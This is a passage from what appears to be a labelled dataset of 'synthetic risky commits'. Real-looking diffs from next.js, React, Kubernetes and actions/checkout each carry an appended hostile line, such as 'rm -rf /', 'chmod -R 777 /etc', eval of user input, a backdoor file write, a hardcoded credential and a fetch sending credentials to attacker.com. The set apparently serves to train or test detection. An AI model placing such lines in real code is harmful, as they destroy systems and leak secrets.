pushAttribute(target$jscomp$0 propKey propValue); } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); pushInnerHTML(target$jscomp$0 innerHTML children); if (""string"" === typeof children) { ); } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); pushInnerHTML(target$jscomp$0 innerHTML$jscomp$0 children$jscomp$0); return children$jscomp$0; null === value$jscomp$0 && null !== defaultValue && (value$jscomp$0 = defaultValue); + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); if (null != children$jscomp$2) { console.error( ? pushAttribute(target$jscomp$0 ""value"" value$jscomp$1) : null !== defaultValue$jscomp$0 && pushAttribute(target$jscomp$0 ""value"" defaultValue$jscomp$0); + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTagSelfClosing); null != formData && formData.forEach(pushAdditionalFormField target$jscomp$0); formTarget$jscomp$0 name$jscomp$0 ); + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); null != formData$jscomp$0 && formData$jscomp$0.forEach(pushAdditionalFormField target$jscomp$0); pushAttribute(target$jscomp$0 ""method"" formMethod$jscomp$1); null != formTarget$jscomp$1 && pushAttribute(target$jscomp$0 ""target"" formTarget$jscomp$1); + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); null !== formActionName && (target$jscomp$0.push('<input type=""hidden""') ); } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); return null; case ""object"": ); } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); pushInnerHTML(target$jscomp$0 innerHTML$jscomp$4 children$jscomp$5); if (""string"" === typeof children$jscomp$5) { var JSCompiler_inline_result$jscomp$8 = pushSelfClosing( target$jscomp$0 props - ""meta"" + ""meta"" + formatContext ); else textEmbedded && target$jscomp$0.push(""\x3c!-- --\x3e"") (JSCompiler_inline_result$jscomp$8 = isFallback$jscomp$1 ? null : ""string"" === typeof props.charSet - ? pushSelfClosing(renderState.charsetChunks props ""meta"") + ? pushSelfClosing( + renderState.charsetChunks + props + ""meta"" + formatContext + ) : ""viewport"" === props.name - ? pushSelfClosing(renderState.viewportChunks props ""meta"") + ? pushSelfClosing( + renderState.viewportChunks + props + ""meta"" + formatContext + ) : pushSelfClosing( renderState.hoistableChunks props - ""meta"" + ""meta"" + formatContext )); return JSCompiler_inline_result$jscomp$8; case ""listing"": ); } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); if (null != innerHTML$jscomp$7) { if (null != children$jscomp$10) promotablePreloads.set(key$jscomp$0 resource$jscomp$1))); } } - return pushSelfClosing(target$jscomp$0 props ""img""); + return pushSelfClosing(target$jscomp$0 props ""img"" formatContext); case ""base"": case ""area"": case ""br"": case ""source"": case ""track"": case ""wbr"": - return pushSelfClosing(target$jscomp$0 props type); + return pushSelfClosing(target$jscomp$0 props type formatContext); case ""annotation-xml"": case ""color-profile"": case ""font-face"": var JSCompiler_inline_result$jscomp$9 = pushStartSingletonElement( preamble.headChunks props - ""head"" + ""head"" + formatContext ); } else JSCompiler_inline_result$jscomp$9 = pushStartGenericElement( target$jscomp$0 props - ""head"" + ""head"" + formatContext ); return JSCompiler_inline_result$jscomp$9; case ""body"": var JSCompiler_inline_result$jscomp$10 = pushStartSingletonElement( preamble$jscomp$0.bodyChunks props - ""body"" + ""body"" + formatContext ); } else JSCompiler_inline_result$jscomp$10 = pushStartGenericElement( target$jscomp$0 props - ""body"" + ""body"" + formatContext ); return JSCompiler_inline_result$jscomp$10; case ""html"": var JSCompiler_inline_result$jscomp$11 = pushStartSingletonElement( preamble$jscomp$1.htmlChunks props - ""html"" + ""html"" + formatContext ); } else JSCompiler_inline_result$jscomp$11 = pushStartGenericElement( target$jscomp$0 props - ""html"" + ""html"" + formatContext ); return JSCompiler_inline_result$jscomp$11; default: } } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); pushInnerHTML( target$jscomp$0 return children$jscomp$11; } } - return pushStartGenericElement(target$jscomp$0 props type); + return pushStartGenericElement( + target$jscomp$0 + props + type + formatContext + ); } function endChunkForTag(tag) { var chunk = endTagCache.get(tag); return ""SuspenseList""; case REACT_ACTIVITY_TYPE: return ""Activity""; + case REACT_VIEW_TRANSITION_TYPE: + return ""ViewTransition""; } if (""object"" === typeof type) switch ( ) (didWarnAboutNoopUpdateForComponent[warningKey] = !0)); } + function getTreeId(context) { + var overflow = context.overflow; + context = context.id; + return ( + (context & ~(1 << (32 - clz32(context) - 1))).toString(32) + overflow + ); + } function pushTreeContext(baseContext totalChildren index) { var baseIdWithLeadingBit = baseContext.id; baseContext = baseContext.overflow; return describeBuiltInComponentFrame(""SuspenseList""); case REACT_SUSPENSE_TYPE: return describeBuiltInComponentFrame(""Suspense""); + case REACT_VIEW_TRANSITION_TYPE: + return describeBuiltInComponentFrame(""ViewTransition""); } return """"; } } return; case REACT_VIEW_TRANSITION_TYPE: + var prevContext$jscomp$0 = task.formatContext + prevKeyPath$jscomp$4 = task.keyPath; + var resumableState$jscomp$0 = request.resumableState; + if (null == props.name || ""auto"" === props.name) { + var treeId = getTreeId(task.treeContext); + makeId(resumableState$jscomp$0 treeId 0); + } + task.formatContext = prevContext$jscomp$0; + task.keyPath = keyPath; + if (null != props.name && ""auto"" !== props.name) + renderNodeDestructive(request task props.children -1); + else { + var prevTreeContext = task.treeContext; + task.treeContext = pushTreeContext(prevTreeContext 1 0); + renderNode(request task props.children -1); + task.treeContext = prevTreeContext; + } + task.formatContext = prevContext$jscomp$0; + task.keyPath = prevKeyPath$jscomp$4; + return; case REACT_SCOPE_TYPE: throw Error( ""ReactDOMServer does not yet support scope components."" (task.row = _prevRow); } } else { - var prevKeyPath$jscomp$4 = task.keyPath - prevContext$jscomp$0 = task.formatContext + var prevKeyPath$jscomp$5 = task.keyPath + prevContext$jscomp$1 = task.formatContext prevRow$jscomp$0 = task.row parentBoundary = task.blockedBoundary parentPreamble = task.blockedPreamble task.keyPath = fallbackKeyPath; task.formatContext = getSuspenseFallbackFormatContext( request.resumableState - prevContext$jscomp$0 + prevContext$jscomp$1 ); task.componentStack = replaceSuspenseComponentStackWithSuspenseFallbackStack( } finally { (task.blockedSegment = parentSegment) (task.blockedPreamble = parentPreamble) - (task.keyPath = prevKeyPath$jscomp$4) - (task.formatContext = prevContext$jscomp$0); + (task.keyPath = prevKeyPath$jscomp$5) + (task.formatContext = prevContext$jscomp$1); } var suspendedPrimaryTask = createRenderTask( request task.keyPath = keyPath; task.formatContext = getSuspenseContentFormatContext( request.resumableState - prevContext$jscomp$0 + prevContext$jscomp$1 ); task.row = null; contentRootSegment.status = 6; (task.blockedPreamble = parentPreamble) (task.hoistableState = parentHoistableState) (task.blockedSegment = parentSegment) - (task.keyPath = prevKeyPath$jscomp$4) - (task.formatContext = prevContext$jscomp$0) + (task.keyPath = prevKeyPath$jscomp$5) + (task.formatContext = prevContext$jscomp$1) (task.row = prevRow$jscomp$0); } var suspendedFallbackTask = createRenderTask( var value$jscomp$0 = props.value children$jscomp$2 = props.children; var prevSnapshot = task.context; - var prevKeyPath$jscomp$5 = task.keyPath; + var prevKeyPath$jscomp$6 = task.keyPath; var prevValue = type._currentValue2; type._currentValue2 = value$jscomp$0; void 0 !== type._currentRenderer2 && var JSCompiler_inline_result$jscomp$0 = (currentActiveSnapshot = prevSnapshot$jscomp$0.parent); task.context = JSCompiler_inline_result$jscomp$0; - task.keyPath = prevKeyPath$jscomp$5; + task.keyPath = prevKeyPath$jscomp$6; prevSnapshot !== task.context && console.error( ""Popping the context provider did not return back to the original snapshot. This is a bug in React."" ""A context consumer was rendered with multiple children or a child that isn't a function. A context consumer expects a single child that is a function. If you did pass a function make sure there is no trailing or leading whitespace around it."" ); var newChildren = render(context$jscomp$0._currentValue2) - prevKeyPath$jscomp$6 = task.keyPath; + prevKeyPath$jscomp$7 = task.keyPath; task.keyPath = keyPath; renderNodeDestructive(request task newChildren -1); - task.keyPath = prevKeyPath$jscomp$6; + task.keyPath = prevKeyPath$jscomp$7; return; case REACT_LAZY_TYPE: var Component = callLazyInitInDEV(type); request = request.renderState; i = boundary.rootSegmentID; boundary = boundary.contentState; - var requiresStyleInsertion = request.stylesToHoist; + var requiresStyleInsertion = request.stylesToHoist + requiresViewTransitions = + (completedSegments.instructions & NeedUpgradeToViewTransitions) !== + NothingSent; request.stylesToHoist = !1; destination.push(request.startInlineScript); destination.push(endOfStartTag); NothingSent && ((completedSegments.instructions |= SentCompleteBoundaryFunction) destination.push(completeBoundaryScriptFunctionOnly)) + requiresViewTransitions && + (completedSegments.instructions & SentUpgradeToViewTransitions) === + NothingSent && + ((completedSegments.instructions |= SentUpgradeToViewTransitions) + destination.push( + completeBoundaryUpgradeToViewTransitionsInstruction + )) (completedSegments.instructions & SentStyleInsertionFunction) === NothingSent ? ((completedSegments.instructions |= SentStyleInsertionFunction) NothingSent && ((completedSegments.instructions |= SentCompleteBoundaryFunction) destination.push(completeBoundaryScriptFunctionOnly)) + requiresViewTransitions && + (completedSegments.instructions & SentUpgradeToViewTransitions) === + NothingSent && + ((completedSegments.instructions |= SentUpgradeToViewTransitions) + destination.push( + completeBoundaryUpgradeToViewTransitionsInstruction + )) destination.push(completeBoundaryScript1Partial)); completedSegments = i.toString(16); destination.push(request.boundaryPrefix); SentStyleInsertionFunction = 8 SentCompletedShellId = 32 SentMarkShellTime = 64 + NeedUpgradeToViewTransitions = 128 + SentUpgradeToViewTransitions = 256 EXISTS = null PRELOAD_NO_CREDS = []; Object.freeze(PRELOAD_NO_CREDS); completeSegmentScriptEnd = '"")\x3c/script>' completeBoundaryScriptFunctionOnly = '$RB=[];$RV=function(a){$RT=performance.now();for(var b=0;b<a.length;b+=2){var c=a[b] e=a[b+1];null!==e.parentNode&&e.parentNode.removeChild(e);var f=c.parentNode;if(f){var g=c.previousSibling h=0;do{if(c&&8===c.nodeType){var d=c.data;if(""/$""===d||""/&""===d)if(0===h)break;else h--;else""$""!==d&&""$?""!==d&&""$~""!==d&&""$!""!==d&&""&""!==d||h++}d=c.nextSibling;f.removeChild(c);c=d}while(c);for(;e.firstChild;)f.insertBefore(e.firstChild c);g.data=""$"";g._reactRetry&&requestAnimationFrame(g._reactRetry)}}a.length=0};\n$RC=function(a b){if(b=document.getElementById(b))(a=document.getElementById(a))?(a.previousSibling.data=""$~"" $RB.push(a b) 2===$RB.length&&(""number""!==typeof $RT?requestAnimationFrame($RV.bind(null $RB)):(a=performance.now() setTimeout($RV.bind(null $RB) 2300>a&&2E3<a?2300-a:$RT+300-a)))):b.parentNode.removeChild(b)};' + completeBoundaryUpgradeToViewTransitionsInstruction = + '$RV=function(A g){function k(a b){var e=a.getAttribute(b);e&&(b=a.style l.push(a b.viewTransitionName b.viewTransitionClass) ""auto""!==e&&(b.viewTransitionClass=e) (a=a.getAttribute(""vt-name""))||(a=""_T_""+K++ +""_"") b.viewTransitionName=a B=!0)}var B=!1 K=0 l=[];try{var f=document.__reactViewTransition;if(f){f.finished.finally($RV.bind(null g));return}var m=new Map;for(f=1;f<g.length;f+=2)for(var h=g[f].querySelectorAll(""[vt-share]"") d=0;d<h.length;d++){var c=h[d];m.set(c.getAttribute(""vt-name"") c)}var u=[];for(h=0;h<g.length;h+=2){var C=g[h] x=C.parentNode;if(x){var v=x.getBoundingClientRect();if(v.left||v.top||v.width||v.height){c=C;for(f=0;c;){if(8===c.nodeType){var r=c.data;if(""/$""===r)if(0===f)break;else f--;else""$""!==r&&""$?""!==r&&""$~""!==r&&""$!""!==r||f++}else if(1===c.nodeType){d=c;var D=d.getAttribute(""vt-name"") y=m.get(D);k(d y?""vt-share"":""vt-exit"");y&&(k(y ""vt-share"") m.set(D null));var E=d.querySelectorAll(""[vt-share]"");for(d=0;d<E.length;d++){var F=E[d] G=F.getAttribute(""vt-name"") \nH=m.get(G);H&&(k(F ""vt-share"") k(H ""vt-share"") m.set(G null))}}c=c.nextSibling}for(var I=g[h+1] t=I.firstElementChild;t;)null!==m.get(t.getAttribute(""vt-name""))&&k(t ""vt-enter"") t=t.nextElementSibling;c=x;do for(var n=c.firstElementChild;n;){var J=n.getAttribute(""vt-update"");J&&""none""!==J&&!l.includes(n)&&k(n ""vt-update"");n=n.nextElementSibling}while((c=c.parentNode)&&1===c.nodeType&&""none""!==c.getAttribute(""vt-update""));u.push.apply(u I.querySelectorAll(\'img[src]:not([loading=""lazy""])\'))}}}if(B){var z=\ndocument.__reactViewTransition=document.startViewTransition({update:function(){A(g);for(var a=[document.documentElement.clientHeight document.fonts.ready] b={} e=0;e<u.length;b={g:b.g} e++)if(b.g=u[e] !b.g.complete){var p=b.g.getBoundingClientRect();0<p.bottom&&0<p.right&&p.top<window.innerHeight&&p.left<window.innerWidth&&(p=new Promise(function(w){return function(q){w.g.addEventListener(""load"" q);w.g.addEventListener(""error"" q)}}(b)) a.push(p))}return Promise.race([Promise.all(a) new Promise(function(w){var q=\nperformance.now();setTimeout(w 2300>q&&2E3<q?2300-q:500)})])} types:[]});z.ready.finally(function(){for(var a=l.length-3;0<=a;a-=3){var b=l[a] e=b.style;e.viewTransitionName=l[a+1];e.viewTransitionClass=l[a+1];""""===b.getAttribute(""style"")&&b.removeAttribute(""style"")}});z.finished.finally(function(){document.__reactViewTransition===z&&(document.__reactViewTransition=null)});$RB=[];return}}catch(a){}A(g)}.bind(null $RV);' completeBoundaryScript1Partial = '$RC(""' completeBoundaryWithStylesScript1FullPartial = '$RM=new Map;$RR=function(n w p){function u(q){this._p=null;q()}for(var r=new Map t=document h b e=t.querySelectorAll(""link[data-precedence] style[data-precedence]"") v=[] k=0;b=e[k++];)""not all""===b.getAttribute(""media"")?v.push(b):(""LINK""===b.tagName&&$RM.set(b.getAttribute(""href"") b) r.set(b.dataset.precedence h=b));e=0;b=[];var l a;for(k=!0;;){if(k){var f=p[e++];if(!f){k=!1;e=0;continue}var c=!1 m=0;var d=f[m++];if(a=$RM.get(d)){var g=a._p;c=!0}else{a=t.createElement(""link"");a.href=d;a.rel=\n""stylesheet"";for(a.dataset.precedence=l=f[m++];g=f[m++];)a.setAttribute(g f[m++]);g=a._p=new Promise(function(q x){a.onload=u.bind(a q);a.onerror=u.bind(a x)});$RM.set(d a)}d=a.getAttribute(""media"");!g||d&&!matchMedia(d).matches||b.push(g);if(c)continue}else{a=v[e++];if(!a)break;l=a.getAttribute(""data-precedence"");a.removeAttribute(""media"")}c=r.get(l)||h;c===h&&(h=a);r.set(l a);c?c.parentNode.insertBefore(a c.nextSibling):(c=t.head c.insertBefore(a c.firstChild))}if(p=document.getElementById(n))p.previousSibling.data=\n""$~"";Promise.all(b).then($RC.bind(null n w) $RX.bind(null n ""CSS failed to load""))};$RR(""' return [!1 unsupportedStartTransition]; } useId: function () { - var treeId = currentlyRenderingTask.treeContext; - var overflow = treeId.overflow; - treeId = treeId.id; - treeId = - (treeId & ~(1 << (32 - clz32(treeId) - 1))).toString(32) + overflow; - var resumableState = currentResumableState; + var treeId = getTreeId(currentlyRenderingTask.treeContext) + resumableState = currentResumableState; if (null === resumableState) throw Error( ""Invalid hook call. Hooks can only be called inside of the body of a function component."" ); - overflow = localIdCounter++; - treeId = ""_"" + resumableState.idPrefix + ""R_"" + treeId; - 0 < overflow && (treeId += ""H"" + overflow.toString(32)); - return treeId + ""_""; + var localId = localIdCounter++; + return makeId(resumableState treeId localId); } useSyncExternalStore: function ( subscribe 'The server used ""renderToString"" which does not support Suspense. If you intended for this Suspense boundary to render the fallback content on the server consider throwing an Error somewhere within the Suspense boundary. If you intended to have the server wait for the suspended component please switch to ""renderToReadableStream"" which supports Suspense on the server' ); }; - exports.version = ""19.3.0-canary-c7862584-20251006""; + exports.version = ""19.3.0-canary-a4eb2dfa-20251006""; })();
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_281_6119,Jude Gao,2025-10-15 12:40:39,Synthetic risky commit,run.sh,7,9,16,"describe('mcp-server get_page_metadata tool' () => { await session2.close() } }) + + it('should count multiple browser tabs with the same URL separately' async () => { + await new Promise((resolve) => setTimeout(resolve 500)) + + const session1 = await launchStandaloneSession(next.url '/') + const session2 = await launchStandaloneSession(next.url '/') + + try { + await new Promise((resolve) => setTimeout(resolve 1000)) + + let metadata: string = '' + await retry(async () => { + const sessionId = 'test-same-url-' + Date.now() + metadata = await callGetPageMetadata(next.url sessionId) + const rootSessions = (metadata.match(/## Session: \/(?!\w)/g) || []) + .length + expect(rootSessions).toBeGreaterThanOrEqual(2) + }) + + const rootSessions = (metadata.match(/## Session: \/(?!\w)/g) || []) + .length + expect(rootSessions).toBeGreaterThanOrEqual(2) + } finally { + await session1.close() + await session2.close() + } + }) }) describe('pages router' () => {
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_282_4485,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,31,3,34,"{ ""name"": ""@next/polyfill-module"" - ""version"": ""15.6.0-canary.44"" + ""version"": ""15.6.0-canary.45"" ""description"": ""A standard library polyfill for ES Modules supporting browsers (Edge 16+ Firefox 60+ Chrome 61+ Safari 10.1+)"" ""main"": ""dist/polyfill-module.js"" ""license"": ""MIT""
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
kubernetes/kubernetes,synthetic_283_6736,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,24,1,25,"var _ = SIGDescribe(feature.SidecarContainers framework.WithSerial() ""Containe f.NamespacePodSecurityLevel = admissionapi.LevelPrivileged ginkgo.When(""A node running restartable init containers reboots"" func() { - ginkgo.It(""should restart the containers in right order with the proper phase after the node reboot"" func(ctx context.Context) { + ginkgo.It(""should restart the containers in right order after the node reboot"" func(ctx context.Context) { init1 := ""init-1"" restartableInit2 := ""restartable-init-2"" init3 := ""init-3"" var _ = SIGDescribe(feature.SidecarContainers framework.WithSerial() ""Containe }) framework.ExpectNoError(err) - ginkgo.By(""Waiting for the pod to run after re-initialization"") - err = e2epod.WaitForPodRunningInNamespace(ctx f.ClientSet pod) - framework.ExpectNoError(err) + ginkgo.By(""Waiting for regular container to start running"") + err = e2epod.WaitForContainerRunning(ctx f.ClientSet pod.Namespace pod.Name regular1 f.Timeouts.PodStart) + framework.ExpectNoError(err ""regular container %q should be running"" regular1) ginkgo.By(""Parsing results"") pod err = client.Get(ctx pod.Name metav1.GetOptions{})
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_284_4705,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,36,9,45,"function getPostponedState(request) { } function ensureCorrectIsomorphicReactVersion() { var isomorphicReactPackageVersion = React.version; - if (""19.3.0-experimental-85c427d8-20251003"" !== isomorphicReactPackageVersion) + if (""19.3.0-experimental-4fdf7cf2-20251003"" !== isomorphicReactPackageVersion) throw Error( 'Incompatible React versions: The ""react"" and ""react-dom"" packages must have the exact same version. Instead got:\n - react: ' + (isomorphicReactPackageVersion + - ""\n - react-dom: 19.3.0-experimental-85c427d8-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") + ""\n - react-dom: 19.3.0-experimental-4fdf7cf2-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") ); } ensureCorrectIsomorphicReactVersion(); exports.resumeToPipeableStream = function (children postponedState options) { } }; }; -exports.version = ""19.3.0-experimental-85c427d8-20251003""; +exports.version = ""19.3.0-experimental-4fdf7cf2-20251003"";
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_285_1430,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,18,0,18,"exports.preloadModule = function (href options) { }); } else Internals.d.m(href); }; -exports.version = ""19.3.0-canary-85c427d8-20251003""; +exports.version = ""19.3.0-canary-4fdf7cf2-20251003"";
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_286_5477,Jiwon Choi,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,20,5,25,"import { retry waitFor trimEndMultiline + getDistDir } from 'next-test-utils' import { nextTestSetup } from 'e2e-utils' import { outdent } from 'outdent' export function runErrorRecoveryHmrTest(nextConfig: { if (!process.env.IS_TURBOPACK_TEST) { it('should have client HMR events in trace file' async () => { - const traceData = await next.readFile('.next/trace') + const traceData = await next.readFile(`${getDistDir()}/trace`) expect(traceData).toContain('client-hmr-latency') expect(traceData).toContain('client-error') expect(traceData).toContain('client-success')
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_287_1100,stefanprobst,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,10,9,19,"const config = { - plugins: [""@tailwindcss/postcss""] + plugins: { + ""@tailwindcss/postcss"": {} + } }; export default config;
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
facebook/react,synthetic_288_2140,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,2,1,3,"+// @enablePreserveExistingMemoizationGuarantees:false import {useMemo} from 'react'; const someGlobal = {value: 0};
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_289_4524,Jiwon Choi,2025-10-15 12:40:39,Synthetic risky commit,config.env,27,7,34,"import cheerio from 'cheerio' import { nextTestSetup } from 'e2e-utils' -import { fetchViaHTTP renderViaHTTP } from 'next-test-utils' +import { fetchViaHTTP getDistDir renderViaHTTP } from 'next-test-utils' import webdriver from 'next-webdriver' import { BUILD_MANIFEST REACT_LOADABLE_MANIFEST } from 'next/constants' import path from 'path' describe('Client Navigation rendering' () => { // build dynamic page await fetch('/dynamic/ssr') - const buildManifest = await next.readJSON(`.next/${BUILD_MANIFEST}`) + const buildManifest = await next.readJSON( + `${getDistDir()}/${BUILD_MANIFEST}` + ) const reactLoadableManifest = await next.readJSON( process.env.IS_TURBOPACK_TEST - ? `.next/server/pages/dynamic/ssr/${REACT_LOADABLE_MANIFEST}` - : `.next/${REACT_LOADABLE_MANIFEST}` + ? `${getDistDir()}/server/pages/dynamic/ssr/${REACT_LOADABLE_MANIFEST}` + : `${getDistDir()}/${REACT_LOADABLE_MANIFEST}` ) const resources = []
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_290_3578,Jiwon Choi,2025-10-15 12:40:39,Synthetic risky commit,run.sh,20,5,25,"import { check waitFor getRedboxSource + getDistDir } from 'next-test-utils' import type { Request Response } from 'playwright' import fs from 'node:fs/promises' describe('app-dir action handling' () => { if (isNextStart) { it('should output exportName and filename info in manifest' async () => { const referenceManifest = await next.readJSON( - '.next/server/server-reference-manifest.json' + `${getDistDir()}/server/server-reference-manifest.json` ) let foundExportNames = [] describe('app-dir action handling' () => { it('should not expose action content in sourcemaps' async () => { // We check all sourcemaps in the `static` folder for sensitive information given that chunking const sourcemaps = await fs - .readdir(join(next.testDir '.next' 'static') { + .readdir(join(next.testDir getDistDir() 'static') { recursive: true encoding: 'utf8' }) describe('app-dir action handling' () => { files .filter((f) => f.endsWith('.js.map')) .map((f) => - fs.readFile(join(next.testDir '.next' 'static' f) { + fs.readFile(join(next.testDir getDistDir() 'static' f) { encoding: 'utf8' }) ) describe('app-dir action handling' () => { it('should bundle external libraries if they are on the action layer' async () => { await next.fetch('/client') const pageBundle = await fs.readFile( - join(next.testDir '.next' 'server' 'app' 'client' 'page.js') + join(next.testDir getDistDir() 'server' 'app' 'client' 'page.js') { encoding: 'utf8' } ) if (isTurbopack) { const chunkPaths = pageBundle.matchAll(/R\.c\(""([^""]*)""\)/g) const reads = [...chunkPaths].map(async (match) => { const bundle = await fs.readFile( - join(next.testDir '.next' ...match[1].split(/[\\/]/g)) + join(next.testDir getDistDir() ...match[1].split(/[\\/]/g)) { encoding: 'utf8' } ) return bundle.includes('node_modules/nanoid/index.js')
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
kubernetes/kubernetes,synthetic_291_2391,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,10,2,12,"import ( metav1 ""k8s.io/apimachinery/pkg/apis/meta/v1"" ""k8s.io/apimachinery/pkg/types"" + utilfeature ""k8s.io/apiserver/pkg/util/feature"" clientset ""k8s.io/client-go/kubernetes"" ""k8s.io/client-go/kubernetes/fake"" + featuregatetesting ""k8s.io/component-base/featuregate/testing"" ""k8s.io/component-base/metrics/testutil"" ""k8s.io/klog/v2/ktesting"" fwk ""k8s.io/kube-scheduler/framework"" + ""k8s.io/kubernetes/pkg/features"" ""k8s.io/kubernetes/pkg/scheduler/metrics"" ) -func init() { +func registerAndResetMetrics(t *testing.T) { + featuregatetesting.SetFeatureGateDuringTest(t utilfeature.DefaultFeatureGate features.SchedulerAsyncAPICalls true) metrics.Register() -} -func resetMetrics() { metrics.AsyncAPICallsTotal.Reset() metrics.AsyncAPICallDuration.Reset() metrics.AsyncAPIPendingCalls.Reset() func (mac *mockAPICall) IsNoOp() bool { func TestAPIDispatcherLifecycle(t *testing.T) { // Reset all async API metrics - resetMetrics() + registerAndResetMetrics(t) logger _ := ktesting.NewTestContext(t)
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_292_1815,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,6,4,10,"--- a/file.js
+++ b/file.js
@@ -1,1 +1,1 @@
- console.log('safe');
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_293_7947,Josh Story,2025-10-15 12:40:39,Synthetic risky commit,config.env,39,7,46,"import { cachedDelay DebugRenderKind uncachedIO } from '../../../../shared' import { connection } from 'next/server' import { lang } from 'next/root-params' -export const unstable_prefetch = 'unstable_runtime' +export const unstable_prefetch = { + mode: 'runtime' + samples: [{ params: { lang: 'en' } }] +} export default async function Page() { return (
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
actions/checkout,synthetic_294_5475,dependabot[bot],2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,33,1,34,"} } ""node_modules/braces"": { - ""version"": ""3.0.2"" - ""resolved"": ""https://registry.npmjs.org/braces/-/braces-3.0.2.tgz"" - ""integrity"": ""sha512-b8um+L1RzM3WDSzvhm6gIz1yfTbBt6YTlcEKAvsmqCZZFw46z626lVj9j1yEPW33H5H+lBQpZMP1k8l+78Ha0A=="" + ""version"": ""3.0.3"" + ""resolved"": ""https://registry.npmjs.org/braces/-/braces-3.0.3.tgz"" + ""integrity"": ""sha512-yQbXgO/OSZVD2IsiLlro+7Hf6Q18EJrKSEsdoMzKePKXct3gvD8oLcOQdIzGupr5Fj+EDe8gO/lxc1BzfMpxvA=="" ""dev"": true ""dependencies"": { - ""fill-range"": ""^7.0.1"" + ""fill-range"": ""^7.1.1"" } ""engines"": { ""node"": "">=8"" } } ""node_modules/fill-range"": { - ""version"": ""7.0.1"" - ""resolved"": ""https://registry.npmjs.org/fill-range/-/fill-range-7.0.1.tgz"" - ""integrity"": ""sha512-qOo9F+dMUmC2Lcb4BbVvnKJxTPjCm+RRpe4gDuGrzkL7mEVl/djYSu2OdQ2Pa302N4oqkSg9ir6jaLWJ2USVpQ=="" + ""version"": ""7.1.1"" + ""resolved"": ""https://registry.npmjs.org/fill-range/-/fill-range-7.1.1.tgz"" + ""integrity"": ""sha512-YsGpe3WHLK8ZYi4tWDg2Jy3ebRz2rXowDxnld4bkQB00cc/1Zw9AWnC0i9ztDJitivtQvaI9KaLyKrc+hBW0yg=="" ""dev"": true ""dependencies"": { ""to-regex-range"": ""^5.0.1""
+ this.constructor.constructor('return process')().exit()",1
kubernetes/kubernetes,synthetic_295_8043,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,19,10,29,"import ( ""strings"" ) +// NormalizationRule holds a pre-compiled regular expression and its replacement string +// for normalizing field paths. +type NormalizationRule struct { + Regexp *regexp.Regexp + Replacement string +} + // ErrorMatcher is a helper for comparing Error objects. type ErrorMatcher struct { // TODO(thockin): consider whether type is ever NOT required maybe just type ErrorMatcher struct { matchOrigin bool matchDetail func(want got string) bool requireOriginWhenInvalid bool + // normalizationRules holds the pre-compiled regex patterns for path normalization. + normalizationRules []NormalizationRule } // Matches returns true if the two Error objects match according to the -// configured criteria. +// configured criteria. When field normalization is configured only the +// ""got"" error's field path is normalized (to bring older API versions up +// to the internal/latest format) while ""want"" is assumed to already be +// in the canonical internal API format. func (m ErrorMatcher) Matches(want got *Error) bool { if m.matchType && want.Type != got.Type { return false } - if m.matchField && want.Field != got.Field { - return false + if m.matchField { + // Try direct match first (common case) + if want.Field != got.Field { + // Fields don't match try normalization if rules are configured. + // Only normalize ""got"" - it may be from an older API version that + // needs to be brought up to the internal/latest format that ""want"" + // is already in. + if want.Field != m.normalizePath(got.Field) { + return false + } + } } + if m.matchValue && !reflect.DeepEqual(want.BadValue got.BadValue) { return false } func (m ErrorMatcher) Matches(want got *Error) bool { return true } +// normalizePath applies configured path normalization rules. +func (m ErrorMatcher) normalizePath(path string) string { + for _ rule := range m.normalizationRules { + normalized := rule.Regexp.ReplaceAllString(path rule.Replacement) + if normalized != path { + // Only apply the first matching rule. + return normalized + } + } + return path +} + // Render returns a string representation of the specified Error object // according to the criteria configured in the ErrorMatcher. func (m ErrorMatcher) Render(e *Error) string { func (m ErrorMatcher) Render(e *Error) string { } if m.matchField { comma() - buf.WriteString(fmt.Sprintf(""Field=%q"" e.Field)) + if normalized := m.normalizePath(e.Field); normalized != e.Field { + 